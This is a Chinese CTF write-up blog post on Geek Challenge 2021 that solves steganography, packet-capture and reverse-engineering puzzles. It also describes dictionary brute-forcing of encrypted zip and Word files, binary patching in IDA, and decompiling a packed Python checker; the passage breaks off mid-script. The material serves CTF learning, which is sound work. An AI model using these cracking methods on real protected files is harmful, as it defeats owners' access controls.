
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>极客大挑战 2021 - Autumnal</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="By  Harry0709   EquinoxMatrix - 01 战队MiscIn the Air
在会场打开手机WiFi就可以得到flag 【  救  命  我  手  机  要  没  电 ,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="Autumnal" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">Autumnal</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">极客大挑战 2021</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">极客大挑战 2021</h1>
        <div class="stuff">
            <span>十二月 01, 2021</span>
            

        </div>
        <div class="content markdown">
            <h2 id="By-Harry0709-Equinox"><a href="#By-Harry0709-Equinox" class="headerlink" title="By  Harry0709   Equinox"></a><strong>By  Harry0709   Equinox</strong></h2><h2 id="Matrix-01-战队"><a href="#Matrix-01-战队" class="headerlink" title="Matrix - 01 战队"></a><strong>Matrix - 01 战队</strong></h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="In-the-Air"><a href="#In-the-Air" class="headerlink" title="In the Air"></a><strong>In the Air</strong></h3><p><img src="https://s3.bmp.ovh/imgs/2021/11/120acfefab0c2e68.png"></p>
<p>在会场打开手机WiFi就可以得到flag <del>【  救  命  我  手  机  要  没  电  了 】</del></p>
<h3 id="easysend"><a href="#easysend" class="headerlink" title="easysend"></a><strong>easysend</strong></h3><p><img src="https://static01.imgkr.com/temp/e7121b53f9424865b81950bd7cc2946e.png"></p>
<p>按照对应操作完成即可得到 flag</p>
<h3 id="今天有被破防吗？"><a href="#今天有被破防吗？" class="headerlink" title="今天有被破防吗？"></a><strong>今天有被破防吗？</strong></h3><p>经过对 txt 里的数据分析可以得到一张图片 ：</p>
<p><img src="https://static01.imgkr.com/temp/92b650f74a3141bb8d1bf4ffd558cd3b.jpg"></p>
<p>经过非常非常仔细的观察后，可以发现上面有部分字母，我们通过 QQ 的截图进行拼凑。 <del>（  QQ  打  钱  ）</del></p>
<p>就可以得到 flag</p>
<p><strong>注：</strong></p>
<p>可以通过 Kali 带的拼图功能完成，需要安装相应的库，相关链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47643893/article/details/113778577"> CTF~ImageMagick+gaps=自动拼图-CSDN博客</a></p>
<p><del>【 要  不  是  我  的  Kali 装  不  上  库 ，而  且  我  忘  记  带  鼠  标  了 ，谁  会  用  QQ  啊 （ b u s h i ）】</del></p>
<h3 id="easycreat"><a href="#easycreat" class="headerlink" title="easycreat"></a><strong>easycreat</strong></h3><p>我们根据hint要求部署一个合约，到网上找相应教程进行对应操作就可以了，学习链接：</p>
<p><code>https://blog.csdn.net/chyabc123456hh/article/details/106950687?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-5.no_search_link&amp;spm=1001.2101.3001.4242.4</code></p>
<p><img src="https://static01.imgkr.com/temp/5d51d891d71848779de1144eefcf3467.png"></p>
<h3 id="这是什么命令"><a href="#这是什么命令" class="headerlink" title="这是什么命令"></a><strong>这是什么命令</strong></h3><p>我们打开题目发现下面有一行 Linux 下的指令我们来简单分析一下：</p>
<p><img src="https://static01.imgkr.com/temp/931ca959829d4d0598d07f764f7ca8f4.png"></p>
<p>首先题目中显示 <code>cat flag.png </code>这个的意思是打开<code>flag.png</code>，接下来的连续两个<code>Base64</code>应该是对这个图片进行两次的<code>Base 64</code>加密，以<code>|</code>进行分割，之后以一个<code>tac</code>对字符进行编号，<code>sort -k 2</code>则是对第二列的值进行排序,之后得到了一个flag.txt。<br>之后以一个<code>rm -f</code>删除了<code>flag.png</code>,并用一个<code>nohub    php -S</code> 开启一个本地的2333端口，将这个<code>txt</code>挂载在 <code>/dev/null</code> 这个端口上。</p>
<h3 id="说实话挺好玩的，不是吗？"><a href="#说实话挺好玩的，不是吗？" class="headerlink" title="说实话挺好玩的，不是吗？"></a><strong>说实话挺好玩的，不是吗？</strong></h3><p>这个题目拿到手后是一个加密<code>word</code>文档，根据压缩包的注释我们知道有一个8位长度的密码，但是我们不管他，直接爆破（网站：<code>https://rixler.password-find.com/?utm_source=WPRM&amp;utm_medium=IDS_TEXT_STRONG&amp;utm_campaign=rixler</code>)冲它就完事了。之后拿到手的是一个有大片空白的文档 ：</p>
<p><img src="https://static01.imgkr.com/temp/4b7b878f5b644091b97dfecc7c3a8eff.png"></p>
<p>看到一大片空白，我们不难想到<code>SNOW</code>隐写，那么我们可以通过<code>SNOW.EXE</code>直接对其进行解密。</p>
<p><img src="https://static01.imgkr.com/temp/f9a862bae4df450282b420b1ba53b78e.png"></p>
<h3 id="PANDORA-PARADOXXX"><a href="#PANDORA-PARADOXXX" class="headerlink" title="PANDORA PARADOXXX"></a><strong>PANDORA PARADOXXX</strong></h3><p>有一说一这个题目挺烦人的，一共对压缩包进行了 4 层加密，第一层是一个伪加密，第二层是一个 6 位字母密码，利用字典可以跑出来，第三层是一个 6 位的数字密码，同样利用字典可以跑出来，最后一层是一个字母密码再次爆破就可以得到<code>Flag</code>。</p>
<p><img src="https://s3.bmp.ovh/imgs/2021/11/03fcaead9e99329a.png"></p>
<h3 id="SAG-Character"><a href="#SAG-Character" class="headerlink" title="SAG Character"></a><strong>SAG Character</strong></h3><p>又是一个费眼睛的题目<del>（ 快 暴 打 S R ）</del>，最开始得到这张图，与<code>MC</code>有关，于是我首先想到的是导入自定义皮肤的功能，将图片导入发现不行，于是开始转向内部方块带有这个符号的，在附魔台我们可以发现相同的符号，于是到百度去找对应翻译语言。</p>
<p>  <img src="https://bkimg.cdn.bcebos.com/pic/2cf5e0fe9925bc31e096ec7658df8db1ca137011?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U3Mg==,g_7,xp_5,yp_5/format,f_auto" alt="img"></p>
<p>在经过翻译之后就可以得到下面的句子 ： </p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">congratulations you have mastered the essence of this symbol.</span><br><span class="line">恭喜你，你已经掌握了这个符号的本质。</span><br><span class="line">the standard galactic alphabetis a writing system used throughout the commander keen series.</span><br><span class="line">标准银河系字母表是整个《指挥官》系列中使用的一种书写系统。</span><br><span class="line">it is a simple substitution cypher where each letter in the latin alphabet has been substituted with a dierent symbol. </span><br><span class="line">这是一个简单的替换式密码，拉丁字母表中的每个字母都被替换成不同的符号。</span><br><span class="line">here is your flag am4z1ngsga1ng4m3</span><br></pre></td></tr></table></figure>



<h3 id="每日一溜"><a href="#每日一溜" class="headerlink" title="每日一溜"></a><strong>每日一溜</strong></h3><p>用<code>wireshark</code>打开，发现有很多数据包，我们通过<code>ctrl+f</code>查找常用文件的后缀名，发现<code>png</code>格式下有一张图片，我们以原始数据保存，用010去掉数据包头尾，头删到‰之前，仅保留png的数据，打开得到一张图片，猜测又是一个图片隐写，<code>binwalk</code>先分析一下，没有东西，拖入<code>010Editor</code>中发现存在<code>rar</code>的标识，于是我们转换图片为<code>rar</code>，发现里面后两个<code>Base64</code>编码的数据，第一个按标准的<code>Base 64</code>求解发现无法得到对应的数据（ 解出来乱码 ），但是在第二个<code>Base 64</code>上发现解出来像是一个<code>Base 64</code>的码表，因此我们猜测第一个是一个换表的<code>Base 64</code>，按照解出来的码表对第一个<code>Base 64</code>进行解密便可以得到对应的<code>Flag</code>。</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h2><h3 id="Re0"><a href="#Re0" class="headerlink" title="Re0"></a><strong>Re0</strong></h3><p><img src="https://static01.imgkr.com/temp/35587fea111c427fabfaf9ceb0e72585.png"></p>
<p>打开ida搜索字符串就可以得到flag</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a><strong>调试</strong></h3><p>打开Ida，对里面程序进行分析，在<code>start</code>函数里我们发现 v3 赋值给 v5出现了问题，我们跳转到对应的区域，我们先分析 v4 赋值的过程，可以看到有一个跳转指令，我们尝试着改成 jz ，再运行看看。<br><img src="https://static01.imgkr.com/temp/7f639880e362489989c2413fe7eec5ce.png"></p>
<p>可以看到程序已经发生了改变：</p>
<p><img src="https://static01.imgkr.com/temp/ac09642d11164774a29f8ae45532ff8e.png"></p>
<p>这个时候我们经过动调可以，观察发现这个程序是一个自解密程序，我们再Linux下进行调试就可以得到flag。</p>
<p>如下图：</p>
<p><img src="https://static01.imgkr.com/temp/4929ead896cb47a894a2272adf080366.png"></p>
<h3 id="刘壮桌面美化大师"><a href="#刘壮桌面美化大师" class="headerlink" title="刘壮桌面美化大师"></a><strong>刘壮桌面美化大师</strong></h3><p><img src="https://static01.imgkr.com/temp/0b6ff5bdfbb548778fc1b731715af3ad.png"></p>
<p>直接在字符串里面查找就可以得到 flag 了</p>
<h3 id="买Activity"><a href="#买Activity" class="headerlink" title="买Activity"></a><strong>买Activity</strong></h3><p><del>（ 又  是  一  个  安  卓  逆  向  ，我  要  学  废  了  ）</del></p>
<p>我们借用 jeb 来进行安卓的逆向，打开对应 apk 文件，在茫茫包中发现 Decode 的身影，此时的心难以言表。</p>
<p><img src="https://static01.imgkr.com/temp/e6428c5ce4d34473a453c19acd3636e9.png"></p>
<p>观察一下发现是不是少了一个最重要的 v0 ，v0 的数据是什么呢？在安卓的 so 文件里面我们可以看到有两个字符串，根据 <code>stringfromnative</code>我们猜测这两个字符串便是传给 v0 的值。</p>
<p><img src="https://static01.imgkr.com/temp/e9e41c341aad4690bb26967006956520.png"></p>
<p>有了数据，也有了解码的方式，我们编写一个脚本来帮助我们解题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1 = [<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;y&#x27;</span> ,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line"><span class="comment">#str1 = [&#x27;I&#x27;,&#x27;k&#x27;,&#x27;x&#x27;,&#x27;c&#x27;,&#x27;$&#x27;,&#x27;d&#x27;,&#x27;F&#x27;,&#x27;d&#x27;,&#x27;O&#x27;,&#x27;C&#x27;,&#x27;B&#x27;,&#x27;q&#x27;,&#x27;!&#x27;,&#x27;O&#x27;,&#x27;h&#x27;,&#x27; &#x27;,&#x27;d&#x27;,&#x27;t&#x27;,&#x27;m&#x27; ]</span></span><br><span class="line">v1=<span class="number">19</span></span><br><span class="line">v3=<span class="number">0</span></span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">while</span> v3&lt;v1 :</span><br><span class="line">     v4=<span class="built_in">ord</span>(str1[v3])</span><br><span class="line">     v3+=<span class="number">1</span></span><br><span class="line">     ans.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(v4^<span class="number">16</span>)))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<p>分别的运行结果是 <code>[&#39;S&#39;, &#39;C&#39;, &#39;T&#39;, &#39;1&#39;, &#39;_&#39;, &#39;c&#39;, &#39;1&#39;, &#39;i&#39;, &#39;y&#39;, &#39;i&#39;, &#39;_&#39;, &#39;3&#39;, &#39;l&#39;, &#39;y&#39;, &#39;E&#39;, &#39;p&#39;, &#39;r&#39;, &#39;e&#39;, &#39;!&#39;]</code></p>
<p><code>[&#39;Y&#39;, &#39;&#123;&#39;, &#39;h&#39;, &#39;s&#39;, &#39;4&#39;, &#39;t&#39;, &#39;V&#39;, &#39;t&#39;, &#39;_&#39;, &#39;S&#39;, &#39;R&#39;, &#39;a&#39;, &#39;1&#39;, &#39;_&#39;, &#39;x&#39;, &#39;0&#39;, &#39;t&#39;, &#39;d&#39;, &#39;&#125;&#39;]</code></p>
<p>我们通过简易的分析可以发现这个是一个栅栏加密，长度为 2，我们将这两个数据放入在线网站进行解密就可以得到我们需要的 flag 了。</p>
<p><strong>注：</strong></p>
<p>与某位<strong>SR</strong>的交流过程</p>
<p><img src="https://static01.imgkr.com/temp/34cf175be59442848dccb9eb80efd9ed.png"></p>
<p>我的方法不是很推荐，建议有兴趣的可以去了解一下 <del>（  其  他  方  法  我  不  会  呀  ）</del></p>
<h3 id="easypyc"><a href="#easypyc" class="headerlink" title="easypyc"></a><strong>easypyc</strong></h3><p>拿到程序一看，图标有点像一个 Python 打包生成的一个程序 ：</p>
<p><img src="https://static01.imgkr.com/temp/a92cafa0f61e426f8a0de984d91068d0.png"></p>
<p>看了看名字有一个 pyc 那肯定就是 Python 打包的一个程序了。那么我们接下要做的便是对这个 exe 进行拆分得到 pyc 文件</p>
<p><strong>拆分学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstaller打包的exe之一键反编译py脚本与防反编译</a></strong></p>
<p>在拆分后我们可以得到一个不带后缀的一个 easypyc 文件，我们补上后缀，到对应网站在线反编译 pyc 成 py 可以得到如下的 Python 代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.5.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: easypyc.py</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line">whatbox = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaaaaaa</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        whatbox[m] = m</span><br><span class="line">        k[m] = <span class="built_in">ord</span>(a[(m % b)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        t = (t + whatbox[i] + k[i]) % <span class="number">256</span></span><br><span class="line">        temp = whatbox[i]</span><br><span class="line">        whatbox[i] = whatbox[t]</span><br><span class="line">        whatbox[t] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bbbbbbbbbb</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    q = <span class="number">0</span></span><br><span class="line">    w = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        q = (q + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        w = (w + whatbox[q]) % <span class="number">256</span></span><br><span class="line">        temp = whatbox[q]</span><br><span class="line">        whatbox[q] = whatbox[w]</span><br><span class="line">        whatbox[w] = temp</span><br><span class="line">        e = (whatbox[q] + whatbox[w]) % <span class="number">256</span></span><br><span class="line">        a[k] = a[k] ^ whatbox[e] ^ <span class="number">102</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccccccccc</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        a[i] ^= a[((i + <span class="number">1</span>) % b)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b):</span><br><span class="line">        a[j] ^= a[(j - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    kkkkkkk = <span class="string">&#x27;Geek2021&#x27;</span></span><br><span class="line">    tttttt = [<span class="number">117</span>, <span class="number">62</span>, <span class="number">240</span>, <span class="number">152</span>, <span class="number">195</span>, <span class="number">117</span>, <span class="number">103</span>, <span class="number">74</span>, <span class="number">240</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">162</span>, <span class="number">17</span>, <span class="number">75</span>, <span class="number">141</span>, <span class="number">165</span>, <span class="number">136</span>, <span class="number">117</span>, <span class="number">113</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">151</span>, <span class="number">174</span>, <span class="number">4</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">101</span>, <span class="number">185</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">87</span>]</span><br><span class="line">    ssss = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    inp = [<span class="number">0</span>] * <span class="built_in">len</span>(ssss)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ssss) != <span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Length Error!!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssss)):</span><br><span class="line">        inp[i] = <span class="built_in">ord</span>(ssss[i])</span><br><span class="line"></span><br><span class="line">    aaaaaaa(kkkkkkk, <span class="built_in">len</span>(kkkkkkk))</span><br><span class="line">    bbbbbbbbbb(inp, <span class="number">32</span>)</span><br><span class="line">    ccccccccc(inp, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> tttttt[m] != inp[m], <span class="string">&#x27;sorry your flag is wrong&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;success!!!!!!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;your flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ssss))</span><br></pre></td></tr></table></figure>



<p>我们进行简单的修改来测试数据内容以及结构（以下是我的部分测试）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.5.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: easypyc.py</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line">whatbox =[<span class="number">41</span>, <span class="number">244</span>, <span class="number">181</span>, <span class="number">212</span>, <span class="number">184</span>, <span class="number">237</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">193</span>, <span class="number">26</span>, <span class="number">137</span>, <span class="number">126</span>, <span class="number">65</span>, <span class="number">122</span>, <span class="number">239</span>, <span class="number">250</span>, <span class="number">214</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">207</span>, <span class="number">240</span>, <span class="number">227</span>, <span class="number">120</span>, <span class="number">48</span>, <span class="number">36</span>, <span class="number">148</span>, <span class="number">234</span>, <span class="number">150</span>, <span class="number">228</span>, <span class="number">165</span>, <span class="number">129</span>, <span class="number">174</span>, <span class="number">56</span>, <span class="number">190</span>, <span class="number">46</span>, <span class="number">127</span>, <span class="number">49</span>, <span class="number">43</span>, <span class="number">245</span>, <span class="number">130</span>, <span class="number">114</span>, <span class="number">34</span>, <span class="number">202</span>, <span class="number">27</span>, <span class="number">131</span>, <span class="number">224</span>, <span class="number">64</span>, <span class="number">160</span>, <span class="number">50</span>, <span class="number">153</span>, <span class="number">157</span>, <span class="number">206</span>, <span class="number">52</span>, <span class="number">91</span>, <span class="number">225</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">147</span>, <span class="number">103</span>, <span class="number">12</span>, <span class="number">30</span>, <span class="number">146</span>, <span class="number">77</span>, <span class="number">61</span>, <span class="number">179</span>, <span class="number">85</span>, <span class="number">101</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">210</span>, <span class="number">47</span>, <span class="number">253</span>, <span class="number">8</span>, <span class="number">98</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">246</span>, <span class="number">67</span>, <span class="number">135</span>, <span class="number">18</span>, <span class="number">255</span>, <span class="number">168</span>, <span class="number">90</span>, <span class="number">139</span>, <span class="number">203</span>, <span class="number">2</span>, <span class="number">242</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">22</span>, <span class="number">220</span>, <span class="number">102</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">37</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">89</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">185</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">252</span>, <span class="number">29</span>, <span class="number">78</span>, <span class="number">63</span>, <span class="number">170</span>, <span class="number">25</span>, <span class="number">222</span>, <span class="number">19</span>, <span class="number">99</span>, <span class="number">44</span>, <span class="number">100</span>, <span class="number">124</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">20</span>, <span class="number">221</span>, <span class="number">177</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">163</span>, <span class="number">3</span>, <span class="number">249</span>, <span class="number">40</span>, <span class="number">93</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">152</span>, <span class="number">223</span>, <span class="number">60</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">97</span>, <span class="number">166</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">230</span>, <span class="number">154</span>, <span class="number">109</span>, <span class="number">178</span>, <span class="number">254</span>, <span class="number">92</span>, <span class="number">132</span>, <span class="number">155</span>, <span class="number">142</span>, <span class="number">1</span>, <span class="number">182</span>, <span class="number">243</span>, <span class="number">215</span>, <span class="number">197</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">151</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">216</span>, <span class="number">180</span>, <span class="number">188</span>, <span class="number">175</span>, <span class="number">59</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">106</span>, <span class="number">121</span>, <span class="number">183</span>, <span class="number">205</span>, <span class="number">42</span>, <span class="number">105</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">23</span>, <span class="number">241</span>, <span class="number">248</span>, <span class="number">118</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">57</span>, <span class="number">158</span>, <span class="number">247</span>, <span class="number">231</span>, <span class="number">24</span>, <span class="number">218</span>, <span class="number">38</span>, <span class="number">149</span>, <span class="number">33</span>, <span class="number">15</span>, <span class="number">164</span>, <span class="number">217</span>, <span class="number">128</span>, <span class="number">115</span>, <span class="number">17</span>, <span class="number">233</span>, <span class="number">53</span>, <span class="number">236</span>, <span class="number">140</span>, <span class="number">51</span>, <span class="number">11</span>, <span class="number">208</span>, <span class="number">196</span>, <span class="number">55</span>, <span class="number">39</span>, <span class="number">172</span>, <span class="number">9</span>, <span class="number">76</span>, <span class="number">80</span>, <span class="number">226</span>, <span class="number">4</span>, <span class="number">70</span>, <span class="number">195</span>, <span class="number">108</span>, <span class="number">201</span>, <span class="number">69</span>, <span class="number">238</span>, <span class="number">123</span>, <span class="number">88</span>, <span class="number">145</span>, <span class="number">162</span>, <span class="number">125</span>, <span class="number">192</span>, <span class="number">219</span>, <span class="number">74</span>, <span class="number">161</span>, <span class="number">81</span>, <span class="number">198</span>, <span class="number">209</span>, <span class="number">73</span>, <span class="number">133</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">251</span>, <span class="number">143</span>, <span class="number">200</span>, <span class="number">194</span>, <span class="number">171</span>, <span class="number">141</span>, <span class="number">104</span>, <span class="number">213</span>, <span class="number">113</span>, <span class="number">6</span>, <span class="number">159</span>, <span class="number">199</span>, <span class="number">167</span>, <span class="number">75</span>, <span class="number">191</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaaaaaa</span>(<span class="params">a</span>):</span><span class="comment">#Geek2021 8</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):    </span><br><span class="line">        whatbox[m] = m      <span 